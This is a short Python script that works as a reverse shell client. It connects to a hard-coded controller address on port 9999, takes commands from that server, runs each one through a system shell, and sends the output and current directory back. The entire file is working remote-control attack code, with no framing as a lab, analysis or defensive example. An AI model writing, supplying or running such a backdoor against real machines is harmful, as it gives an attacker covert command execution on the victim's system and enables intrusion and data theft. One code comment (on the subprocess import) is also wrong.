import socket # for socket of client side
import os # for executing commands of client side
import subprocess # for file size

s = socket.socket() # creating socket object
host = "192.168.1.127"
port = 9999


s.connect((host, port)) # connecting to server

while True:
    data = s.recv(1024) # receiving data from server
    if data[:2].decode("utf-8") == "cd": # if data is cd then change directory
        os.chdir(data[3:].decode("utf-8")) # changing directory
    if len(data) > 0: # if data is not empty
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # executing command
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)
s.close() # closing connection
